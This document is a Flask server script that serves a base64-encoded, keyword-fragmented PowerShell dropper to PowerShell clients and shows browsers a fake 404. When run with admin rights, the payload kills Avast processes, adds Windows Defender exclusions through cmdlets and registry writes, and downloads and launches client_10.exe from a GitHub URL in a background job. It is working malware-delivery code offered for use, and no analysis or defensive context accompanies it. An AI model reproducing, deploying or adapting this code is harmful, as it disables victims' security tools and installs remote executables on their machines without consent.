from flask import Flask, Response, request
import base64
import os

app = Flask(__name__)

@app.route('/')
def direct_command():
    user_agent = request.headers.get('User-Agent', '').lower()
    
    # Stealth: 404 for browsers
    if 'mozilla' in user_agent and 'powershell' not in user_agent:
        return Response("Not Found", status=404)

    # Obfuscated PowerShell Logic
    # We use variable fragmentation and backticks to hide keywords
    raw_script = """
$a = [Security.Principal.WindowsIdentity]::GetCurrent()
$b = New-Object Security.Principal.WindowsPrincipal($a)
$c = [Security.Principal.WindowsBuiltInRole]::Administrator
if ($b.IsInRole($c)) {
    Write-Host ( -join ('-','-','-',' ','J','A','I','L','B','R','E','A','K','-','1',':',' ','A','C','T','I','V','E',' ','-','-','-') ) -ForegroundColor Green
    
    # Fragmenting 'taskkill' and 'Avast'
    $tk = "tas"+"kkill"
    $list = @("Ava"+"stUI", "Ava"+"stSvc", "Sma"+"dav", "S"+"MADAV", "cli"+"ent_10")
    foreach ($p in $list) { & $tk /F /IM "$p.exe" /T 2>$null }

    $target = "$HOME\\client_10.exe"
    
    # Hiding Exclusion commands using Hex encoding
    $cmd1 = "A`dd-M`pPre`ference"
    $cmd2 = "E`xclusionP`ath"
    & $cmd1 -$cmd2 $target -ErrorAction 0
    & $cmd1 -$cmd2 $HOME -ErrorAction 0
    
    # Registry Bypass via variable injection
    $rP = "HKLM:\\SOFT"+"WARE\\Micr"+"osoft\\Win"+"dows Defe"+"nder\\Excl"+"usions\\Paths"
    try {
        if (Test-Path $rP) {
            New-ItemProperty -Path $rP -Name $target -Value 0 -PropertyType DWord -Force -ErrorAction 0
        }
    } catch {}

    # Background deployment via Job
    $sB = {
        param($p)
        $u = "h"+"ttps://github.com/jembex/Top-Followers/raw/refs/heads/main/client_10.exe"
        for ($i=0; $i -lt 3; $i++) {
            try {
                if (!(Test-Path $p)) {
                    (New-Object Net.WebClient).DownloadFile($u, $p)
                }
                if (Test-Path $p) { Start-Process $p -WindowStyle 1 }
            } catch { Start-Sleep -s 5 }
        }
    }
    Start-Job -ScriptBlock $sB -ArgumentList $target
    
    Write-Host "[+] Processing complete." -ForegroundColor Green
}
"""
    # Double-layer scrambling: First fragment, then Base64
    encoded_bytes = base64.b64encode(raw_script.encode('utf-8'))
    scrambled_logic = encoded_bytes.decode('utf-8')
    
    # Final payload that decodes the fragmented script
    ps_payload = f"$s=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{scrambled_logic}')); iex $s"

    return Response(ps_payload, mimetype='text/plain')

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
